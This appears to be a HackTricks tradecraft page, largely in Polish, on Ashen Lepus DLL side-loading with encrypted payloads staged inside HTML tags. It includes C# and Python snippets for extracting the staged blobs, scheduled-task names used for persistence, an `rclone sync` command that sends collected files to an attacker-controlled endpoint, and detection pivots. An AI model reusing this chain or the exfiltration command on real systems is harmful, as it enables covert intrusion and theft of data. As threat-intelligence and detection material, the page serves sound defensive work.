# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) weaponized a repeatable pattern that chains DLL sideloading, staged HTML payloads, and modular .NET backdoors to persist inside Middle Eastern diplomatic networks. The technique is reusable by any operator because it relies on:

- **Archive-based social engineering**: niewinne pliki PDF instruują cele, aby pobrały archiwum RAR z serwisu do udostępniania plików. Archiwum zawiera wyglądający na prawdziwy EXE przeglądarki dokumentów, złośliwy DLL nazwany jak zaufana biblioteka (np. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) oraz wabik `Document.pdf`.
- **DLL search order abuse**: użytkownik dwukrotnie klika EXE, Windows rozwiązuje import DLL z bieżącego katalogu, a złośliwy loader (AshenLoader) wykonuje się wewnątrz zaufanego procesu, podczas gdy wabikowy PDF otwiera się, by nie wzbudzać podejrzeń.
- **Living-off-the-land staging**: każdy późniejszy etap (AshenStager → AshenOrchestrator → modules) jest trzymany poza dyskiem aż do potrzeby i dostarczany jako zaszyfrowane blobs ukryte w pozornie nieszkodliwych odpowiedziach HTML.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE side-loads AshenLoader, który wykonuje host recon, szyfruje go AES-CTR i wysyła przez POST wewnątrz rotujących parametrów takich jak `token=`, `id=`, `q=` lub `auth=` do ścieżek przypominających API (np. `/api/v2/account`).
2. **HTML extraction**: C2 ujawnia następny etap tylko wtedy, gdy client IP zlokalizuje się w docelowym regionie i `User-Agent` pasuje do implantu, co utrudnia sandboxes. Po pomyślnych sprawdzeniach ciało HTTP zawiera blob `<headerp>...</headerp>` z Base64/AES-CTR zaszyfrowanym ładunkiem AshenStager.
3. **Second sideload**: AshenStager jest wdrażany z innym legalnym binarkiem, który importuje `wtsapi32.dll`. Złośliwa kopia wstrzyknięta do binarki pobiera więcej HTML, tym razem wycinając `<article>...</article>`, aby odzyskać AshenOrchestrator.
4. **AshenOrchestrator**: modułowy .NET controller, który dekoduje Base64 JSON config. Pola `tg` i `au` z configu są konkatenowane/zahaszowane w celu utworzenia klucza AES, którym odszyfrowuje się `xrk`. Otrzymane bajty służą jako klucz XOR dla każdego pobieranego później module blob.
5. **Module delivery**: każdy moduł opisany jest za pomocą komentarzy HTML, które przekierowują parser do dowolnego tagu, łamiąc statyczne reguły szukające tylko `<headerp>` lub `<article>`. Moduły obejmują persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) oraz file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Nawet jeśli obrońcy zablokują lub usuną konkretny element, operator musi jedynie zmienić tag wskazany w komentarzu HTML, aby wznowić dostarczanie.

### Szybkie narzędzie ekstrakcji (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

Najnowsze badania nad HTML smuggling (Talos) pokazują payloady ukryte jako ciągi Base64 wewnątrz bloków `<script>` w załącznikach HTML i dekodowane przez JavaScript w czasie wykonywania. Ten sam trik można użyć w odpowiedziach C2: umieścić zaszyfrowane bloby wewnątrz znacznika `<script>` (lub innego elementu DOM) i dekodować je w pamięci przed AES/XOR, sprawiając, że strona wygląda jak zwykła strona HTML.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: obecne loaders osadzają 256-bit keys plus nonces (np. `{9a 20 51 98 ...}`) i opcjonalnie dodają warstwę XOR używając ciągów takich jak `msasn1.dll` przed/po odszyfrowaniu.
- **Infrastructure split + subdomain camouflage**: serwery staging są rozdzielone per tool, hostowane w różnych ASN i czasami frontowane przez subdomeny wyglądające na legitymne, więc ujawnienie jednego etapu nie odsłania reszty.
- **Recon smuggling**: zbierane dane teraz obejmują listingi Program Files, aby zidentyfikować aplikacje o wysokiej wartości i zawsze są szyfrowane zanim opuszczą hosta.
- **URI churn**: parametry query i ścieżki REST rotują między kampaniami (`/api/v1/account?token=` → `/api/v2/account?auth=`), unieważniając kruche detekcje.
- **Gated delivery**: serwery są geofencowane i odpowiadają tylko prawdziwym implantom. Nieautoryzowani klienci otrzymują niebudzący podejrzeń HTML.

## Persistence & Execution Loop

AshenStager tworzy zaplanowane zadania, które maskują się jako zadania konserwacyjne Windows i wykonują się przez `svchost.exe`, np.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Te zadania ponownie uruchamiają sideloading chain przy starcie systemu lub okresowo, zapewniając, że AshenOrchestrator może pobrać świeże moduły bez ponownego zapisu na dysku.

## Using Benign Sync Clients for Exfiltration

Operatorzy umieszczają dokumenty dyplomatyczne w `C:\Users\Public` (dostępne dla wszystkich i niebudzące podejrzeń) za pomocą dedykowanego modułu, a następnie pobierają legalny binarny plik [Rclone](https://rclone.org/) by zsynchronizować ten katalog z pamięcią atakującego. Unit42 zauważa, że to pierwszy raz, gdy aktor ten został zaobserwowany używający Rclone do exfiltracji, co wpisuje się w szerszy trend nadużywania legalnych narzędzi synchronizacji, by wtapiać się w normalny ruch:

1. **Stage**: skopiuj/zbierz docelowe pliki do `C:\Users\Public\{campaign}\`.
2. **Configure**: dostarcz plik konfiguracyjny Rclone wskazujący na kontrolowany przez atakującego endpoint HTTPS (np. `api.technology-system[.]com`).
3. **Sync**: uruchom `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet`, tak aby ruch przypominał normalne kopie zapasowe w chmurze.

Ponieważ Rclone jest powszechnie używany w legalnych workflowach backupowych, obrońcy muszą skupić się na anomalnych wykonaniach (nowe binaria, nietypowe remotes lub nagłe synchronizacje `C:\Users\Public`).

## Detection Pivots

- Generuj alert dla **podpisanych procesów**, które nieoczekiwanie ładują DLL z ścieżek zapisywalnych przez użytkownika (filtry Procmon + `Get-ProcessMitigation -Module`), szczególnie gdy nazwy DLL pokrywają się z `netutils`, `srvcli`, `dwampi` lub `wtsapi32`.
- Analizuj podejrzane odpowiedzi HTTPS pod kątem **dużych blobów Base64 osadzonych w nietypowych tagach** lub chronionych komentarzami `<!-- TAG: <xyz> -->`.
- Rozszerz polowanie w HTML o **ciągi Base64 wewnątrz bloków `<script>`** (staging w stylu HTML smuggling), które są dekodowane przez JavaScript przed przetwarzaniem AES/XOR.
- Szukaj **zaplanowanych zadań**, które uruchamiają `svchost.exe` z argumentami niebędącymi usługami lub wskazujących z powrotem na katalogi droppera.
- Monitoruj pojawianie się binariów **Rclone** poza lokalizacjami zarządzanymi przez IT, nowe pliki `rclone.conf` lub zadania synchronizacji pobierające z katalogów staging, takich jak `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)

{{#include ../../../banners/hacktricks-training.md}}
